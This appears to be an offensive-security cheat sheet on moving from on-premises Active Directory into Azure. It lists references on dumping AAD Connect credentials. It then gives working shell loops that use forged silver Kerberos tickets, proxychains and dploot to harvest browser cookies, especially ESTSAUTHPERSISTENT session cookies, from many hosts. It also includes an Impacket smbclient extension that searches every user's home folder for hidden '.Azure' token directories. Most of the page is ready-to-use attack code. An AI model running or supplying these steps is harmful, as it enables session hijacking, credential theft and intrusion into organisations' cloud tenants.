# On-Prem â†’ Cloud

- [https://aadinternals.com/post/on-prem_admin/](https://aadinternals.com/post/on-prem_admin/)
- [https://dirkjanm.io/azure-ad-privilege-escalation-application-admin/](https://dirkjanm.io/azure-ad-privilege-escalation-application-admin/)
- [https://nullg0re.com/2024/05/cracking-zero-trust-on-prem-to-azure-pivots-with-responder-and-evilginx2/](https://nullg0re.com/2024/05/cracking-zero-trust-on-prem-to-azure-pivots-with-responder-and-evilginx2/)




## Dumping AAD Connect Creds

- [https://dirkjanm.io/updating-adconnectdump-a-journey-into-dpapi/](https://dirkjanm.io/updating-adconnectdump-a-journey-into-dpapi/)
- [https://aadinternals.com/post/adsync/](https://aadinternals.com/post/adsync/)
- [https://imphash.medium.com/shooting-up-on-prem-to-cloud-detecting-aadconnect-creds-dump-422b21128729](https://imphash.medium.com/shooting-up-on-prem-to-cloud-detecting-aadconnect-creds-dump-422b21128729)
- [https://rioasmara.com/2020/07/07/azure-ad-connect-post-exploitation-for-dcsync/](https://rioasmara.com/2020/07/07/azure-ad-connect-post-exploitation-for-dcsync/)
- [[PDF] Hacking Azure AD via Active Directory (Dirk-jan Mollema, @_dirkjan)](https://dirkjanm.io/assets/raw/TR19-Im%20in%20your%20cloud.pdf)



### Tools

- [https://github.com/dirkjanm/adconnectdump](https://github.com/dirkjanm/adconnectdump)
- [https://github.com/Hagrid29/DumpAADSyncCreds](https://github.com/Hagrid29/DumpAADSyncCreds)




## Mass Cookies Harvesting

Collect with [dploot](https://github.com/zblurx/dploot):

```
$ ls silver_tickets/
SRV01.ccache   SRV02.ccache   PC01.ccache
$ for st in `ls silver_tickets/`; do comp=`basename $st .ccache`; KRB5CCNAME="silver_tickets/$st" proxychains4 dploot browser -d megacorp.local -no-pass -use-kcache "$comp.megacorp.local" -pvk ../key.pvk -show-cookies > "browsers_$comp.out"; done
```

Search for `ESTSAUTHPERSISTENT` cookies:

```
$ grep -nr --include '*.out' ESTSAUTHPERSISTENT -A3 | grep -e Creation -e Expires
```




## Mass Hidden Directories Searching

Impacket's **smbclient.py** extension (searches for hidden directories in every user's home):

```python
def do_hidden(self, args=None):
    hidden = []
    for item1 in self.smb.listPath(self.share, '\\Users\\*'):
        longname1 = item1.get_longname()
        if item1.is_directory() and longname1 not in ('.', '..'):
            dir0 = ntpath.join('\\Users', longname1)
            try:
                ls = self.smb.listPath(self.share, ntpath.join(dir0, '*'))
            except:
                continue
            else:
                for item2 in ls:
                    longname2 = item2.get_longname()
                    if item2.is_directory() and longname2 not in ('.', '..') and longname2.startswith('.'):
                        hidden.append((item2, ntpath.join(dir0, longname2)))
    result = ''
    for item, name in hidden:
        result += 'drw-rw-rw- '
        result += f'{datetime.fromtimestamp(item.get_mtime_epoch()).strftime("%Y/%m/%d %H:%M:%S"):>21} '
        result += '  '
        result += name
        result += '\n'
    print(result.strip())
```

Collect hidden directories:

```
$ ls silver_tickets/
SRV01.ccache   SRV02.ccache   PC01.ccache
$ echo 'use c$\nhidden' > cmd
$ for st in `ls silver_tickets/`; do comp=`basename $st .ccache`; KRB5CCNAME="silver_tickets/$st" proxychains4 smbclient.py -k -no-pass "$comp.megacorp.local" -inputfile cmd -outputfile "hidden_$comp.out"; done
```

Search for hidden directories that start with `.az`:

```
$ grep -nr --include '*.out' '\Users' | grep -i '\.Az'
```
